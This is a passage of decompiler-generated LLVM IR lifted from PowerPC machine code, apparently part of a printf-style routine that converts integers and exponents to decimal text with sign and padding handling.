  %v3_1000cde0 = add i32 %v2_1000cde0, 1
  %v4_1000cde0 = inttoptr i32 %v3_1000cde0 to i8*
  store i8 0, i8* %v4_1000cde0, align 1
  %v0_1000cde4 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000cde4 = add i32 %v0_1000cde4, 1
  store i32 %v1_1000cde4, i32* %r9.global-to-local, align 4
  %v0_1000cde8 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000cde8, label %dec_label_pc_1000cdec, label %dec_label_pc_1000ce10

dec_label_pc_1000cdec:                            ; preds = %dec_label_pc_1000cdd8
  %v0_1000cdec = load i32, i32* %r7.global-to-local, align 4
  %v1_1000cdec = icmp slt i32 %v0_1000cdec, -4
  %v3_1000cdec = icmp eq i32 %v0_1000cdec, -4
  store i1 %v1_1000cdec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cdec, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_1000cdec, label %dec_label_pc_1000ce08, label %dec_label_pc_1000cdf4

dec_label_pc_1000cdf4:                            ; preds = %dec_label_pc_1000cdec
  %v1_1000cdf4 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000cdf4 = icmp sgt i32 %v1_1000cdf4, %v0_1000cdec
  %v3_1000cdf4 = icmp slt i32 %v1_1000cdf4, %v0_1000cdec
  %v4_1000cdf4 = icmp eq i32 %v1_1000cdf4, %v0_1000cdec
  store i1 %v2_1000cdf4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000cdf4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000cdf4, label %dec_label_pc_1000ce08, label %dec_label_pc_1000cdfc

dec_label_pc_1000cdfc:                            ; preds = %dec_label_pc_1000cdf4
  %v2_1000cdfc = sub i32 %v1_1000cdf4, %v0_1000cdec
  store i32 %v2_1000cdfc, i32* %r30.global-to-local, align 4
  store i32 102, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000ce28

dec_label_pc_1000ce08:                            ; preds = %dec_label_pc_1000cdf4, %dec_label_pc_1000cdec
  store i32 103, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000ce1c

dec_label_pc_1000ce10:                            ; preds = %dec_label_pc_1000cdd8
  %v0_1000ce10 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000ce10 = icmp slt i32 %v0_1000ce10, 102
  %v3_1000ce10 = icmp eq i32 %v0_1000ce10, 102
  store i1 %v1_1000ce10, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ce10, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_1000ce10, i32* %r4.global-to-local, align 4
  br i1 %v3_1000ce10, label %dec_label_pc_1000ce28thread-pre-split, label %dec_label_pc_1000ce1c

dec_label_pc_1000ce1c:                            ; preds = %dec_label_pc_1000ce10, %dec_label_pc_1000ce08
  store i32 0, i32* %r10.global-to-local, align 4
  store i1 false, i1* %cr6_lt.global-to-local, align 1
  store i1 false, i1* %cr6_gt.global-to-local, align 1
  store i1 true, i1* %cr6_eq.global-to-local, align 1
  br label %dec_label_pc_1000ce3c

dec_label_pc_1000ce28thread-pre-split:            ; preds = %dec_label_pc_1000ce10
  %v0_1000ce28.pr = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000ce28

dec_label_pc_1000ce28:                            ; preds = %dec_label_pc_1000ce28thread-pre-split, %dec_label_pc_1000cdfc
  %v0_1000ce2c = phi i32 [ %v0_1000ce28.pr, %dec_label_pc_1000ce28thread-pre-split ], [ %v0_1000cdec, %dec_label_pc_1000cdfc ]
  %v1_1000ce28 = icmp slt i32 %v0_1000ce2c, 0
  %v2_1000ce28 = icmp sgt i32 %v0_1000ce2c, 0
  %v3_1000ce28 = icmp eq i32 %v0_1000ce2c, 0
  store i1 %v1_1000ce28, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1000ce28, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1000ce28, i1* %cr6_eq.global-to-local, align 1
  store i32 %v0_1000ce2c, i32* %r10.global-to-local, align 4
  %tmp78 = icmp sgt i32 %v0_1000ce2c, -1
  br i1 %tmp78, label %dec_label_pc_1000ce3c, label %dec_label_pc_1000ce34

dec_label_pc_1000ce34:                            ; preds = %dec_label_pc_1000ce28
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_1000ce38 = load i32, i32* %r8.global-to-local, align 4
  %v3_1000ce38 = add i32 %v2_1000ce38, -1
  %v4_1000ce38 = inttoptr i32 %v3_1000ce38 to i8*
  store i8 48, i8* %v4_1000ce38, align 1
  store i32 %v3_1000ce38, i32* %r8.global-to-local, align 4
  %v1_1000ce58.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_1000ce6c.pre = load i1, i1* %cr6_lt.global-to-local, align 1
  br label %dec_label_pc_1000ce3c

dec_label_pc_1000ce3c:                            ; preds = %dec_label_pc_1000ce28, %dec_label_pc_1000ce1c, %dec_label_pc_1000ce34
  %v0_1000ce6c = phi i1 [ %v1_1000ce28, %dec_label_pc_1000ce28 ], [ false, %dec_label_pc_1000ce1c ], [ %v0_1000ce6c.pre, %dec_label_pc_1000ce34 ]
  %v1_1000ce58 = phi i32 [ %v1_1000cde4, %dec_label_pc_1000ce28 ], [ %v1_1000cde4, %dec_label_pc_1000ce1c ], [ %v1_1000ce58.pre, %dec_label_pc_1000ce34 ]
  store i32 176, i32* %r5.global-to-local, align 4
  store i32 1, i32* %stack_var_-140, align 4
  %v2_1000ce48 = ptrtoint i32* %stack_var_-196 to i32
  store i32 %v2_1000ce48, i32* %r0.global-to-local, align 4
  %v0_1000ce50 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000ce50 = add i32 %v0_1000ce50, 1
  store i32 %v1_1000ce50, i32* %r6.global-to-local, align 4
  %v2_1000ce58 = sub i32 %v1_1000ce58, %v1_1000ce50
  store i32 %v2_1000ce58, i32* %r11.global-to-local, align 4
  %v1_1000ce5c = inttoptr i32 %v0_1000ce50 to i8*
  %v2_1000ce5c = load i8, i8* %v1_1000ce5c, align 1
  %v3_1000ce5c = zext i8 %v2_1000ce5c to i32
  store i32 %v3_1000ce5c, i32* %stack_var_-196, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v0_1000ce6c, label %dec_label_pc_1000cecc, label %dec_label_pc_1000ce70

dec_label_pc_1000ce70:                            ; preds = %dec_label_pc_1000ce3c
  %v0_1000ce70 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000ce70 = icmp slt i32 %v0_1000ce70, %v2_1000ce58
  %v4_1000ce70 = icmp eq i32 %v0_1000ce70, %v2_1000ce58
  store i1 %v2_1000ce70, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000ce70, i1* %cr7_eq.global-to-local, align 1
  store i32 112, i32* %r0.global-to-local, align 4
  store i32 112, i32* %stack_var_-132, align 4
  br i1 %v2_1000ce70, label %dec_label_pc_1000cec4, label %dec_label_pc_1000ce84

dec_label_pc_1000ce84:                            ; preds = %dec_label_pc_1000ce70
  %v2_1000ce84 = sub i32 %v0_1000ce70, %v2_1000ce58
  store i32 %v2_1000ce84, i32* %r0.global-to-local, align 4
  %v4_1000ce84 = icmp sgt i32 %v2_1000ce84, 0
  store i32 -1, i32* %r10.global-to-local, align 4
  br i1 %v4_1000ce84, label %dec_label_pc_1000cea0, label %dec_label_pc_1000ce90

dec_label_pc_1000ce90:                            ; preds = %dec_label_pc_1000ce84
  %v2_1000ce94 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000ce94, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000cee8

dec_label_pc_1000cea0:                            ; preds = %dec_label_pc_1000ce84
  store i32 ptrtoint (i32* @global_var_1000f983.241 to i32), i32* %r9.global-to-local, align 4
  %v2_1000ceac = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_1000ceac, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 176, i32* %stack_var_-120, align 4
  br label %dec_label_pc_1000cee8

dec_label_pc_1000cec4:                            ; preds = %dec_label_pc_1000ce70
  %v0_1000cec4 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_1000cec4, label %dec_label_pc_1000ced4, label %dec_label_pc_1000cec8

dec_label_pc_1000cec8:                            ; preds = %dec_label_pc_1000cec4
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000cecc

dec_label_pc_1000cecc:                            ; preds = %dec_label_pc_1000ce3c, %dec_label_pc_1000cec8
  %v2_1000cecc = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_1000cecc, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000cee8

dec_label_pc_1000ced4:                            ; preds = %dec_label_pc_1000cec4
  %v2_1000ced4 = sub i32 %v2_1000ce58, %v0_1000ce70
  store i32 %v2_1000ced4, i32* %r11.global-to-local, align 4
  %v2_1000cedc = add i32 %v0_1000ce70, %v1_1000ce50
  store i32 %v2_1000cedc, i32* %r6.global-to-local, align 4
  %v2_1000cee0 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000cee0, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000cee8

dec_label_pc_1000cee8:                            ; preds = %dec_label_pc_1000cecc, %dec_label_pc_1000cea0, %dec_label_pc_1000ce90, %dec_label_pc_1000ced4
  %v1_1000cf14 = phi i32 [ %v2_1000cecc, %dec_label_pc_1000cecc ], [ %v2_1000ceac, %dec_label_pc_1000cea0 ], [ %v2_1000ce94, %dec_label_pc_1000ce90 ], [ %v2_1000cee0, %dec_label_pc_1000ced4 ]
  %v0_1000cef4 = phi i32 [ %v2_1000ce58, %dec_label_pc_1000cecc ], [ 0, %dec_label_pc_1000cea0 ], [ 0, %dec_label_pc_1000ce90 ], [ %v2_1000ced4, %dec_label_pc_1000ced4 ]
  %v3_1000cee8 = load i32, i32* %v2_1000cab8, align 4
  store i32 %v3_1000cee8, i32* %r0.global-to-local, align 4
  %v1_1000ceec = and i32 %v3_1000cee8, 16
  store i32 %v1_1000ceec, i32* %r9.global-to-local, align 4
  %v3_1000ceec = icmp eq i32 %v1_1000ceec, 0
  br i1 %v3_1000ceec, label %dec_label_pc_1000cef4, label %dec_label_pc_1000cf0c

dec_label_pc_1000cef4:                            ; preds = %dec_label_pc_1000cee8
  %v1_1000cef4 = icmp slt i32 %v0_1000cef4, 0
  %v3_1000cef4 = icmp eq i32 %v0_1000cef4, 0
  store i1 %v1_1000cef4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cef4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000cef4, label %dec_label_pc_1000cefc, label %dec_label_pc_1000cf0c

dec_label_pc_1000cefc:                            ; preds = %dec_label_pc_1000cef4
  %v0_1000cefc = load i32, i32* %r31.global-to-local, align 4
  %v1_1000cefc = icmp slt i32 %v0_1000cefc, 103
  %v3_1000cefc = icmp eq i32 %v0_1000cefc, 103
  store i1 %v1_1000cefc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cefc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000cefc, label %dec_label_pc_1000cf2c, label %dec_label_pc_1000cf04

dec_label_pc_1000cf04:                            ; preds = %dec_label_pc_1000cefc
  %v0_1000cf04 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000cf04 = icmp slt i32 %v0_1000cf04, 0
  %v3_1000cf04 = icmp eq i32 %v0_1000cf04, 0
  store i1 %v1_1000cf04, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cf04, i1* %cr7_eq.global-to-local, align 1
  %tmp79 = icmp slt i32 %v0_1000cf04, 1
  br i1 %tmp79, label %dec_label_pc_1000cf2c, label %dec_label_pc_1000cf0c

dec_label_pc_1000cf0c:                            ; preds = %dec_label_pc_1000cef4, %dec_label_pc_1000cee8, %dec_label_pc_1000cf04
  %v2_1000cf14 = inttoptr i32 %v1_1000cf14 to i32*
  store i32 112, i32* %v2_1000cf14, align 4
  store i32 ptrtoint (i32* @global_var_1000f990.242 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000cf20 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000cf20 = add i32 %v1_1000cf20, 8
  %v3_1000cf20 = inttoptr i32 %v2_1000cf20 to i32*
  store i32 ptrtoint (i32* @global_var_1000f990.242 to i32), i32* %v3_1000cf20, align 4
  %v0_1000cf24 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000cf24 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000cf24 = add i32 %v1_1000cf24, 4
  %v3_1000cf24 = inttoptr i32 %v2_1000cf24 to i32*
  store i32 %v0_1000cf24, i32* %v3_1000cf24, align 4
  %v0_1000cf28 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000cf28 = add i32 %v0_1000cf28, 12
  store i32 %v1_1000cf28, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000cf2c

dec_label_pc_1000cf2c:                            ; preds = %dec_label_pc_1000cf04, %dec_label_pc_1000cefc, %dec_label_pc_1000cf0c
  %v1_1000cf3c = phi i32 [ %v1_1000cf14, %dec_label_pc_1000cf04 ], [ %v1_1000cf14, %dec_label_pc_1000cefc ], [ %v1_1000cf28, %dec_label_pc_1000cf0c ]
  %v0_1000cf2c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000cf2c = add i32 %v0_1000cf2c, 1
  store i32 %v1_1000cf2c, i32* %r10.global-to-local, align 4
  %v4_1000cf2c = icmp eq i32 %v1_1000cf2c, 0
  br i1 %v4_1000cf2c, label %dec_label_pc_1000cf54, label %dec_label_pc_1000cf34

dec_label_pc_1000cf34:                            ; preds = %dec_label_pc_1000cf2c
  %v1_1000cf34 = sub i32 -1, %v0_1000cf2c
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_1000cf3c = add i32 %v1_1000cf3c, 4
  %v3_1000cf3c = inttoptr i32 %v2_1000cf3c to i32*
  store i32 %v1_1000cf34, i32* %v3_1000cf3c, align 4
  store i32 ptrtoint (i32* @global_var_1000f983.241 to i32), i32* %r9.global-to-local, align 4
  %v0_1000cf48 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000cf48 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000cf48 = inttoptr i32 %v1_1000cf48 to i32*
  store i32 %v0_1000cf48, i32* %v2_1000cf48, align 4
  %v0_1000cf4c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cf4c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000cf4c = add i32 %v1_1000cf4c, 8
  %v3_1000cf4c = inttoptr i32 %v2_1000cf4c to i32*
  store i32 %v0_1000cf4c, i32* %v3_1000cf4c, align 4
  %v0_1000cf50 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000cf50 = add i32 %v0_1000cf50, 12
  store i32 %v1_1000cf50, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000cf54

dec_label_pc_1000cf54:                            ; preds = %dec_label_pc_1000cf2c, %dec_label_pc_1000cf34
  %v1_1000cf60 = phi i32 [ %v1_1000cf3c, %dec_label_pc_1000cf2c ], [ %v1_1000cf50, %dec_label_pc_1000cf34 ]
  %v0_1000cf54 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000cf54 = icmp slt i32 %v0_1000cf54, 0
  %v3_1000cf54 = icmp eq i32 %v0_1000cf54, 0
  store i1 %v1_1000cf54, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cf54, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000cf54, label %dec_label_pc_1000cf70, label %dec_label_pc_1000cf5c

dec_label_pc_1000cf5c:                            ; preds = %dec_label_pc_1000cf54
  store i32 112, i32* %r0.global-to-local, align 4
  %v0_1000cf60 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000cf60 = add i32 %v1_1000cf60, 8
  %v3_1000cf60 = inttoptr i32 %v2_1000cf60 to i32*
  store i32 %v0_1000cf60, i32* %v3_1000cf60, align 4
  %v0_1000cf64 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000cf64 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000cf64 = inttoptr i32 %v1_1000cf64 to i32*
  store i32 %v0_1000cf64, i32* %v2_1000cf64, align 4
  %v0_1000cf68 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000cf68 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000cf68 = add i32 %v1_1000cf68, 4
  %v3_1000cf68 = inttoptr i32 %v2_1000cf68 to i32*
  store i32 %v0_1000cf68, i32* %v3_1000cf68, align 4
  %v0_1000cf6c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000cf6c = add i32 %v0_1000cf6c, 12
  store i32 %v1_1000cf6c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000cf70

dec_label_pc_1000cf70:                            ; preds = %dec_label_pc_1000cf54, %dec_label_pc_1000cf5c
  %v1_1000cf98 = phi i32 [ %v1_1000cf60, %dec_label_pc_1000cf54 ], [ %v1_1000cf6c, %dec_label_pc_1000cf5c ]
  %v0_1000cf70 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000cf70 = icmp slt i32 %v0_1000cf70, 103
  %v3_1000cf70 = icmp eq i32 %v0_1000cf70, 103
  store i1 %v1_1000cf70, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cf70, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000cf70, label %dec_label_pc_1000cf78, label %dec_label_pc_1000cf84

dec_label_pc_1000cf78:                            ; preds = %dec_label_pc_1000cf70
  %v3_1000cf78 = load i32, i32* %v2_1000cab8, align 4
  store i32 %v3_1000cf78, i32* %r0.global-to-local, align 4
  %v1_1000cf7c = and i32 %v3_1000cf78, 16
  store i32 %v1_1000cf7c, i32* %r9.global-to-local, align 4
  %v3_1000cf7c = icmp eq i32 %v1_1000cf7c, 0
  br i1 %v3_1000cf7c, label %dec_label_pc_1000cfb0, label %dec_label_pc_1000cf84

dec_label_pc_1000cf84:                            ; preds = %dec_label_pc_1000cf70, %dec_label_pc_1000cf78
  %v0_1000cf84 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000cf84 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000cf84 = sub i32 %v1_1000cf84, %v0_1000cf84
  store i32 %v2_1000cf84, i32* %r9.global-to-local, align 4
  %v1_1000cf88 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000cf88 = icmp sgt i32 %v1_1000cf88, %v2_1000cf84
  %v4_1000cf88 = icmp eq i32 %v1_1000cf88, %v2_1000cf84
  store i1 %v2_1000cf88, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000cf88, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000cf88, label %dec_label_pc_1000cf90, label %dec_label_pc_1000cfb0

dec_label_pc_1000cf90:                            ; preds = %dec_label_pc_1000cf84
  %v2_1000cf90 = sub i32 %v1_1000cf88, %v2_1000cf84
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_1000cf98 = add i32 %v1_1000cf98, 4
  %v3_1000cf98 = inttoptr i32 %v2_1000cf98 to i32*
  store i32 %v2_1000cf90, i32* %v3_1000cf98, align 4
  store i32 ptrtoint (i32* @global_var_1000f983.241 to i32), i32* %r9.global-to-local, align 4
  %v0_1000cfa4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000cfa4 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000cfa4 = inttoptr i32 %v1_1000cfa4 to i32*
  store i32 %v0_1000cfa4, i32* %v2_1000cfa4, align 4
  %v0_1000cfa8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cfa8 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000cfa8 = add i32 %v1_1000cfa8, 8
  %v3_1000cfa8 = inttoptr i32 %v2_1000cfa8 to i32*
  store i32 %v0_1000cfa8, i32* %v3_1000cfa8, align 4
  %v0_1000cfac = load i32, i32* %r8.global-to-local, align 4
  %v1_1000cfac = add i32 %v0_1000cfac, 12
  store i32 %v1_1000cfac, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000cfb0

dec_label_pc_1000cfb0:                            ; preds = %dec_label_pc_1000cf84, %dec_label_pc_1000cf78, %dec_label_pc_1000cf90
  %v1_1000d04437 = phi i32 [ %v1_1000cf98, %dec_label_pc_1000cf84 ], [ %v1_1000cf98, %dec_label_pc_1000cf78 ], [ %v1_1000cfac, %dec_label_pc_1000cf90 ]
  %v0_1000cfb0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000cfb0 = icmp slt i32 %v0_1000cfb0, 102
  %v3_1000cfb0 = icmp eq i32 %v0_1000cfb0, 102
  store i1 %v1_1000cfb0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cfb0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000cfb0, label %dec_label_pc_1000d038, label %dec_label_pc_1000cfb8

dec_label_pc_1000cfb8:                            ; preds = %dec_label_pc_1000cfb0
  %v0_1000cfb8 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000cfb8 = icmp slt i32 %v0_1000cfb8, 0
  %v3_1000cfb8 = icmp eq i32 %v0_1000cfb8, 0
  store i1 %v1_1000cfb8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cfb8, i1* %cr7_eq.global-to-local, align 1
  store i32 %stack_var_-194.0, i32* %r5.global-to-local, align 4
  store i32 %v0_1000cfb8, i32* %r11.global-to-local, align 4
  store i32 43, i32* %r4.global-to-local, align 4
  %tmp80 = icmp sgt i32 %v0_1000cfb8, -1
  br i1 %tmp80, label %dec_label_pc_1000cfd4, label %dec_label_pc_1000cfcc

dec_label_pc_1000cfcc:                            ; preds = %dec_label_pc_1000cfb8
  %v1_1000cfcc = sub i32 0, %v0_1000cfb8
  store i32 %v1_1000cfcc, i32* %r11.global-to-local, align 4
  store i32 45, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000cfd4

dec_label_pc_1000cfd4:                            ; preds = %dec_label_pc_1000cfb8, %dec_label_pc_1000cfcc
  %v0_1000cfe831 = phi i32 [ %v0_1000cfb8, %dec_label_pc_1000cfb8 ], [ %v1_1000cfcc, %dec_label_pc_1000cfcc ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000cfd8 = ptrtoint i32* %stack_var_-179 to i32
  store i32 %v2_1000cfd8, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-179, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  store i32 10, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000cfe8

dec_label_pc_1000cfe8:                            ; preds = %dec_label_pc_1000cfe8.backedge, %dec_label_pc_1000cfd4
  %v2_1000d008 = phi i32 [ %v3_1000d008, %dec_label_pc_1000cfe8.backedge ], [ %v2_1000cfd8, %dec_label_pc_1000cfd4 ]
  %v0_1000cfec = phi i32 [ %v0_1000cfec.pre, %dec_label_pc_1000cfe8.backedge ], [ 2, %dec_label_pc_1000cfd4 ]
  %v1_1000cfe8 = phi i32 [ %v1_1000cfe8.pre, %dec_label_pc_1000cfe8.backedge ], [ 10, %dec_label_pc_1000cfd4 ]
  %v1_1000cffc = phi i32 [ %v0_1000cfe8.pre, %dec_label_pc_1000cfe8.backedge ], [ %v0_1000cfe831, %dec_label_pc_1000cfd4 ]
  %v2_1000cfe8 = sdiv i32 %v1_1000cffc, %v1_1000cfe8
  store i32 %v2_1000cfe8, i32* %r0.global-to-local, align 4
  %v1_1000cfec = add i32 %v0_1000cfec, 1
  store i32 %v1_1000cfec, i32* %r7.global-to-local, align 4
  %v1_1000cff0 = icmp slt i32 %v1_1000cfec, 3
  %v3_1000cff0 = icmp eq i32 %v1_1000cfec, 3
  store i1 %v1_1000cff0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cff0, i1* %cr7_eq.global-to-local, align 1
  %v1_1000cff8 = icmp slt i32 %v2_1000cfe8, 0
  %v2_1000cff8 = icmp sgt i32 %v2_1000cfe8, 0
  %v3_1000cff8 = icmp eq i32 %v2_1000cfe8, 0
  store i1 %v1_1000cff8, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1000cff8, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1000cff8, i1* %cr6_eq.global-to-local, align 1
  %tmp81 = mul i32 %v2_1000cfe8, -10
  store i32 %v2_1000cfe8, i32* %r11.global-to-local, align 4
  %v2_1000cffc = add i32 %v1_1000cffc, 48
  %v1_1000d004 = add i32 %v2_1000cffc, %tmp81
  store i32 %v1_1000d004, i32* %r9.global-to-local, align 4
  %v1_1000d008 = trunc i32 %v1_1000d004 to i8
  %v3_1000d008 = add i32 %v2_1000d008, -1
  %v4_1000d008 = inttoptr i32 %v3_1000d008 to i8*
  store i8 %v1_1000d008, i8* %v4_1000d008, align 1
  store i32 %v3_1000d008, i32* %r10.global-to-local, align 4
  %v0_1000d00c = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1000d00c = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1000d00c = or i1 %v0_1000d00c, %v1_1000d00c
  br i1 %v2_1000d00c, label %dec_label_pc_1000cfe8.backedge, label %dec_label_pc_1000d010

dec_label_pc_1000cfe8.backedge:                   ; preds = %dec_label_pc_1000cfe8, %dec_label_pc_1000d010
  %v0_1000cfe8.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000cfe8.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_1000cfec.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000cfe8

dec_label_pc_1000d010:                            ; preds = %dec_label_pc_1000cfe8
  %v0_1000d010 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_1000d010, label %dec_label_pc_1000d014, label %dec_label_pc_1000cfe8.backedge

dec_label_pc_1000d014:                            ; preds = %dec_label_pc_1000d010
  %v1_1000d014 = add i32 %v2_1000d008, -2
  store i32 %v1_1000d014, i32* %r9.global-to-local, align 4
  store i32 112, i32* %r0.global-to-local, align 4
  %v1_1000d01c = add i32 %v2_1000d008, -3
  store i32 %v1_1000d01c, i32* %r11.global-to-local, align 4
  %v0_1000d020 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d020 = trunc i32 %v0_1000d020 to i8
  %v4_1000d020 = inttoptr i32 %v1_1000d014 to i8*
  store i8 %v1_1000d020, i8* %v4_1000d020, align 1
  %v0_1000d024 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d024 = trunc i32 %v0_1000d024 to i8
  %v2_1000d024 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000d024 = add i32 %v2_1000d024, -1
  %v4_1000d024 = inttoptr i32 %v3_1000d024 to i8*
  store i8 %v1_1000d024, i8* %v4_1000d024, align 1
  %v0_1000d028 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d028 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000d028 = inttoptr i32 %v1_1000d028 to i32*
  store i32 %v0_1000d028, i32* %v2_1000d028, align 4
  %v0_1000d02c = load i32, i32* %r7.global-to-local, align 4
  %v1_1000d02c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000d02c = add i32 %v1_1000d02c, 4
  %v3_1000d02c = inttoptr i32 %v2_1000d02c to i32*
  store i32 %v0_1000d02c, i32* %v3_1000d02c, align 4
  %v0_1000d030 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d030 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000d030 = add i32 %v1_1000d030, 8
  %v3_1000d030 = inttoptr i32 %v2_1000d030 to i32*
  store i32 %v0_1000d030, i32* %v3_1000d030, align 4
  %v0_1000d034 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000d034 = add i32 %v0_1000d034, 12
  store i32 %v1_1000d034, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000d038

dec_label_pc_1000d038:                            ; preds = %dec_label_pc_1000cfb0, %dec_label_pc_1000cb8c, %dec_label_pc_1000d014
  %v0_1000d0b4 = phi i32 [ %v1_1000d04437, %dec_label_pc_1000cfb0 ], [ %v2_1000cb98, %dec_label_pc_1000cb8c ], [ %v1_1000d034, %dec_label_pc_1000d014 ]
  %v2_1000d038 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_1000d038, i32* %r9.global-to-local, align 4
  %v1_1000d048.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000d03c

dec_label_pc_1000d03c:                            ; preds = %dec_label_pc_1000d03c, %dec_label_pc_1000d038
  %v1_1000d048 = phi i32 [ %v2_1000d048, %dec_label_pc_1000d03c ], [ %v1_1000d048.pre, %dec_label_pc_1000d038 ]
  %v0_1000d03c = phi i32 [ %v1_1000d040, %dec_label_pc_1000d03c ], [ %v2_1000d038, %dec_label_pc_1000d038 ]
  %v1_1000d03c = inttoptr i32 %v0_1000d03c to i32*
  %v2_1000d03c = load i32, i32* %v1_1000d03c, align 4
  store i32 %v2_1000d03c, i32* %r0.global-to-local, align 4
  %v1_1000d040 = add i32 %v0_1000d03c, 12
  store i32 %v1_1000d040, i32* %r9.global-to-local, align 4
  %v2_1000d044 = icmp ult i32 %v1_1000d040, %v0_1000d0b4
  %v2_1000d048 = sub i32 %v1_1000d048, %v2_1000d03c
  store i32 %v2_1000d048, i32* @r28, align 4
  br i1 %v2_1000d044, label %dec_label_pc_1000d03c, label %dec_label_pc_1000d050

dec_label_pc_1000d050:                            ; preds = %dec_label_pc_1000d03c
  %v4_1000d044 = icmp eq i32 %v1_1000d040, %v0_1000d0b4
  store i1 false, i1* %cr7_lt.global-to-local, align 1
